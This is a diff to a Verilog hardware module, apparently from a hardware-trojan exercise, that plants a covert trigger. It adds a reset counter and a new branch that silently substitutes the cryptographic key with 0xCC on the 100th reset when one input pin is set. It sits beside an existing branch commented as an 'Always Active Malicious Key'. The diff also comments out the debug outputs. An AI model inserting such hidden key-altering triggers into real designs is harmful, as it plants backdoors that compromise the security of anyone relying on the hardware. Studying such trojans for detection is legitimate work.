@@ -106,20 +106,38 @@ shift_register debug_module(
     .data_out(uo_out[7])
 );
 
+reg [6:0] reset_counter; // 7-bit counter for up to 127 resets
+
+// Increment the counter on the rising edge of rst_n
+always @(posedge clk or negedge rst_n) begin
+    if (reset_counter === 7'bxxxxxxx) begin
+        reset_counter <= 0; // Initialize to 0 if the counter is in an unknown state
+    end else if (!rst_n) begin
+        reset_counter <= reset_counter + 1; // Increment the counter on each reset release
+    end else if (reset_counter > 101) begin //After the 100 reset meaning 101, reset the counter.
+        reset_counter <= 0;
+    end 
+end
+
+
 // Conditional key selection logic with prioritized conditions
 always @(posedge clk) begin
     if (ui_in[3] && !ui_in[1]) begin
             selected_key <= 8'hAC;  // Condition 1: Always Active Malicious Key (AC)
     end else if (ui_in[5] && !ui_in[1]) begin
             selected_key <= 8'h00;  // Condition 3: Disable Key (No Key, set to 0)
+    end else if (ui_in[4] && reset_counter == 100) begin // on the 100th reset, alter the key.
+            selected_key <= 8'hCC;
     end else begin
             selected_key <= key;    // Default condition: Use the regular key
     end
 end
 
-// Conditional outputs for debugging
-assign uo_out[3] = (ena && ui_in[6]) ? ui_in[0] : 1'b0;
-assign uo_out[4] = (ena && ui_in[6]) ? ui_in[1] : 1'b0;
-assign uo_out[5] = (ena && ui_in[6]) ? ui_in[2] : 1'b0;
+// // Conditional outputs for debugging
+// assign uo_out[3] = (ena && ui_in[6]) ? ui_in[0] : 1'b0;
+// assign uo_out[4] = (ena && ui_in[6]) ? ui_in[1] : 1'b0;
+// assign uo_out[5] = (ena && ui_in[6]) ? ui_in[2] : 1'b0;
+
+
 
 endmodule
